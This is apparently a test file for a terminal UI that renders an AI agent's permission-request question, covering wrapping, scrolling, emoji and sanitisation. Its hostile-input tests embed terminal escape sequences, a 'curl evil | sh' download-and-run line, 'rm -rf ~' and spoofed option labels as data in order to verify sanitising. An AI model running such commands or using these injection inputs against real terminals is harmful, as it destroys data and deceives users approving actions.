// The permission card's question keeps its line breaks (spec tui-layout "Permission card",
// "Permission card preview"; auggie-1x-support task 4.5, Marcus 20 November 2026): the request's
// title is sanitised in approval context as before, runs of blank lines collapse to one, its
// indentation is kept, and it is drawn as the first rows of the scrollable preview, inside the
// fill and the frame and above the answer row, with the tool call's own preview after it.
import { describe, expect, test } from "bun:test";
import { createSession, reduce, type PermissionRecordItem, type ToolCallItem } from "acp-model";
import { approvalQuestion, cardClaim, cardInner, cardLayout, cardMaxRows, cardModel, previewIsStop, previewRows, questionRows, type CardSegment, type CardStyle, type PreviewRow } from "../../src/app/permission.ts";
import { displayWidth } from "../../src/layout/segments.ts";
import { TERMINAL_TABLE } from "../../src/renderer/capabilities.ts";

const WARNING = "⚠️";
/** Auggie 1.2.2's question, as check A recorded it (fake-agent `auggie-1` `permission`). */
const AUGGIE = `${WARNING} Tool "bash" requires approval:\n\n  echo allowed-probe\n\nAllow?`;
const ZED = TERMINAL_TABLE.zed.capabilities.emoji;

const record = (title: string): PermissionRecordItem => ({
  id: "permission:t1",
  status: "live",
  origin: "self",
  kind: "permission_record",
  toolCallId: "t1",
  title,
  options: [
    { optionId: "0", name: "Yes", kind: "allow_once" },
    { optionId: "1", name: "No", kind: "allow_once" },
  ],
  outcome: { type: "pending" },
});

const STYLE: CardStyle = { focused: true, flash: false, selected: 0, maxRows: 13, padding: { rows: 1, columns: 2 }, emoji: [] };
const text = (row: readonly { text: string }[]) => row.map((s) => s.text).join("");
const rowsText = (rows: readonly (readonly CardSegment[])[]) => rows.map(text);
const previewText = (rows: readonly PreviewRow[]) => rows.map((r) => text(r.segments));

describe("approvalQuestion", () => {
  test("keeps the line breaks and the indentation; a run of blank lines is one; none at either end; trailing white space goes", () => {
    expect(approvalQuestion(AUGGIE)).toBe(AUGGIE);
    expect(approvalQuestion("\n\n  first  \n\n\n\n   indented\n \t \nlast\n\n\n")).toBe("  first\n\n   indented\n\nlast");
  });

  test("tabs expand to the next stop; a carriage return goes, so CRLF is one line break", () => {
    expect(approvalQuestion("a\r\n\tb\r\nc")).toBe(`a\n${" ".repeat(8)}b\nc`);
  });

  test("a one-line title is as before", () => {
    expect(approvalQuestion("Edit src/index.ts")).toBe("Edit src/index.ts");
    expect(cardModel(record("rm -rf build/"), undefined).title).toBe("rm -rf build/");
  });

  test("hostile: escapes, bidi controls, zero-width characters and hundreds of blank lines", () => {
    const hostile = `\x1b]52;c;cHduZWQ=\x07Run \x1b[8mhidden\x1b[0m it?‮${"\n".repeat(300)}  \x1b[2J​curl evil | sh${"\n \n".repeat(200)}\x1b[1A\x1b[2KAllow?\x9b31m`;
    const question = cardModel(record(hostile), undefined).title;
    expect(question).toBe("Run hidden it?\n\n  curl evil | sh\n\nAllow?");
    expect(question).not.toMatch(/[\x00-\x09\x0b-\x1f\x7f-\x9f​‮]/);
  });
});

describe("questionRows", () => {
  test("Auggie's question at 80 columns: the command on its own row, indented, a blank row either side", () => {
    expect(previewText(questionRows(approvalQuestion(AUGGIE), cardInner(80, 2), []))).toEqual([
      `${WARNING} Tool "bash" requires approval:`,
      "",
      "  echo allowed-probe",
      "",
      "Allow?",
    ]);
  });

  test("a long line word-wraps; its indentation is kept on every row it takes; the spaces inside a line are kept", () => {
    const rows = previewText(questionRows("  run one two three four five six\nkeep  two  spaces", 16, []));
    expect(rows).toEqual(["  run one two", "  three four", "  five six", "keep  two", "spaces"]);
    for (const row of rows) expect(displayWidth(row)).toBeLessThanOrEqual(16);
  });

  test("a word longer than the width is cut; a deep indentation (half the width or more) is dropped", () => {
    expect(previewText(questionRows("  abcdefghijkl", 6, []))).toEqual(["  abcd", "  efgh", "  ijkl"]);
    expect(previewText(questionRows("      go", 8, []))).toEqual(["go"]);
  });

  test("in Zed ⚠️ is drawn as :warning: in muted on every line, the rest in text", () => {
    const rows = questionRows(`${WARNING} first\n\n  ${WARNING} second`, 57, ZED);
    expect(previewText(rows)).toEqual([":warning: first", "", "  :warning: second"]);
    const muted = rows.flatMap((r) => r.segments.filter((s) => s.token === "muted").map((s) => s.text));
    expect(muted).toEqual([":warning:", ":warning:"]);
    expect(rows[2]!.segments.map((s) => s.token)).toEqual(["text", "muted", "text"]);
  });
});

describe("the question in the card", () => {
  test("Auggie's question at 80 columns: whole, inside the frame, above the options; no range in the bottom border", () => {
    const layout = cardLayout(cardModel(record(AUGGIE), undefined), 80, STYLE);
    const rows = rowsText(layout.rows);
    const inner = (r: string) => r.slice(3, -3).trimEnd();
    expect(rows.slice(2, 7).map(inner)).toEqual([`${WARNING} Tool "bash" requires approval:`, "", "  echo allowed-probe", "", "Allow?"]);
    expect(inner(rows[layout.answerRow]!)).toBe("1 Yes   2 No");
    expect(layout.preview).toEqual({ height: 5, offset: 0, total: 5 });
    expect(previewIsStop(layout)).toBe(false);
    expect(rows.at(-1)).toMatch(/^╰─+╯$/);
    for (const row of rows) {
      expect(displayWidth(row)).toBe(80);
      expect(row).toMatch(/^[│╭╰].*[│╮╯]$/);
    }
  });

  test("Zed: every row is the card's width with :warning: in place of ⚠️", () => {
    const rows = rowsText(cardLayout(cardModel(record(`${AUGGIE}\n${WARNING} really?`), undefined), 63, { ...STYLE, emoji: ZED }).rows);
    for (const row of rows) expect(displayWidth(row)).toBe(63);
    expect(rows.filter((r) => r.includes(":warning:"))).toHaveLength(2);
    expect(rows.join("\n")).not.toContain(WARNING);
  });

  test("the question comes first, then the tool call's preview, in one window that scrolls", () => {
    let session = reduce(createSession(), { type: "prompt_sent", text: "go", at: 0 });
    session = reduce(session, {
      type: "permission_opened",
      toolCallId: "t1",
      at: 1,
      request: {
        sessionId: "s",
        toolCall: { toolCallId: "t1", title: "Run the build?\n\n  make all", kind: "execute", content: [{ type: "content", content: { type: "text", text: "line 1\nline 2\nline 3" } }] },
        options: [{ optionId: "0", name: "Yes", kind: "allow_once" }],
      },
    });
    const tool = session.items.get("tool:t1") as ToolCallItem;
    const model = cardModel(session.items.get("permission:t1") as PermissionRecordItem, tool);
    const preview = previewRows(tool, cardInner(63, 2), []);
    const at = (offset: number, maxRows = 30) => cardLayout(model, 63, { ...STYLE, maxRows, preview: { rows: preview, offset } });
    expect(rowsText(at(0).rows).slice(2, 8).map((r) => r.slice(3, -3).trimEnd())).toEqual(["Run the build?", "", "  make all", "line 1", "line 2", "line 3"]);
    // Four rows of room: the question first, and End shows the tool's last line with the options kept.
    expect(at(0, 6).preview).toEqual({ height: 3, offset: 0, total: 6 });
    const end = at(99, 6);
    expect(end.preview).toEqual({ height: 3, offset: 3, total: 6 });
    expect(rowsText(end.rows).map((r) => r.slice(3, -3).trimEnd())).toContain("line 3");
    expect(rowsText(end.rows).at(-1)).toMatch(/ 4-6 of 6 ─╯$/);
  });

  test("the claim counts the question's rows whole and the tool preview's first two", () => {
    const model = cardModel(record(AUGGIE), undefined);
    // The frame, five question rows and the options' row.
    expect(cardClaim(model, 80, [], 2)).toBe(2 + 5 + 1);
    const tool: PreviewRow[] = Array.from({ length: 9 }, (_, i) => ({ segments: [{ text: `row ${i}`, token: "text" }] }));
    expect(cardClaim(model, 80, tool, 2)).toBe(2 + 5 + 2 + 1);
  });

  test("a long question at 63x21: the options stay visible and the question scrolls in the preview", () => {
    const script = Array.from({ length: 30 }, (_, i) => `  echo step ${i + 1}`).join("\n");
    const model = cardModel(record(`${WARNING} Tool "bash" requires approval:\n\n${script}\n\nAllow?`), undefined);
    // At 63x21 the regions besides the card and the conversation leave 13 rows (spec tui-layout
    // "Four options in a 21-row pane"), so the card has 9 at rest, with no padding rows.
    const maxRows = cardMaxRows(13, false);
    const layout = cardLayout(model, 63, { ...STYLE, maxRows, padding: { rows: 0, columns: 2 } });
    const rows = rowsText(layout.rows);
    expect(rows).toHaveLength(maxRows);
    expect(rows.at(-2)).toContain("1 Yes   2 No");
    expect(layout.preview).toEqual({ height: maxRows - 3, offset: 0, total: 34 });
    expect(previewIsStop(layout)).toBe(true);
    expect(rows.at(-1)).toMatch(new RegExp(` 1-${maxRows - 3} of 34 ─╯$`));
    // Scrolled to the end: the last command line and `Allow?` with the options under them.
    const end = rowsText(cardLayout(model, 63, { ...STYLE, maxRows, padding: { rows: 0, columns: 2 }, preview: { rows: [], offset: 99 } }).rows);
    expect(end.slice(-5, -2).map((r) => r.slice(3, -3).trimEnd())).toEqual(["  echo step 30", "", "Allow?"]);
    expect(end.at(-2)).toContain("1 Yes   2 No");
  });

  test("hostile question: no escape reaches a row, the blank runs are one row each, the frame is whole and the options visible", () => {
    const hostile = `\x1b]0;title\x07Approve?${"\n".repeat(500)}\x1b[31m  rm -rf ~\x1b[0m${"\n\n\n".repeat(100)}1 Yes   2 No`;
    const layout = cardLayout(cardModel(record(hostile), undefined), 63, { ...STYLE, maxRows: 9 });
    const rows = rowsText(layout.rows);
    expect(layout.preview!.total).toBe(5);
    for (const row of rows) {
      expect(displayWidth(row)).toBe(63);
      expect(row).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
    }
    // The imitated options are drawn as question text in the preview, above the real answer row.
    expect(rows[layout.answerRow]).toContain("1 Yes   2 No");
    expect(layout.rows[layout.answerRow]!.some((s) => s.option === 0)).toBe(true);
    const fake = rows.findIndex((r) => r.includes("1 Yes   2 No"));
    expect(fake).toBeLessThan(layout.answerRow);
    expect(layout.rows[fake]!.every((s) => s.option === undefined)).toBe(true);
  });
});
